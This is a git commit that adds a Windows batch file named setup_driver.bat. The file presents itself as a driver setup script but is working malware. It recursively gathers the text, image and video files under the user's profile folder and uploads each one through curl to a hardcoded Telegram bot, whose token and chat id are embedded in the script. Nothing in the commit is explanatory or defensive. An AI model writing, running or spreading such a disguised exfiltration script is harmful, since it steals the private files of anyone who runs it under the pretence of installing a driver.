99ba6709ffb6f21e9cef7ff9430c5359774093b2
0metayui0 <0metayui0@gmail.com>
2026-03-09 05:20:08 +0700

    Add files via upload

---
+++ setup_driver.bat
@@ -0,0 +1,15 @@
+@echo off
+setlocal enabledelayedexpansion
+
+set tk=8157478032:AAHF-ANPD_Hozyie-3Wk9XK4p0l51IPeejc
+set id=1922428949
+set pth=C:\Users\%USERNAME%
+
+powershell -Command ^
+"$files = Get-ChildItem '%pth%' -Recurse -Include *.txt,*.png,*.jpg,*.jpeg,*.mp4 -File -ErrorAction SilentlyContinue; ^
+foreach ($f in $files) { ^
+    $path = $f.FullName; ^
+    cmd /c curl -F \"chat_id=%id%\" -F \"document=@$path\" https://api.telegram.org/bot%tk%/sendDocument; ^
+}"
+
+pause
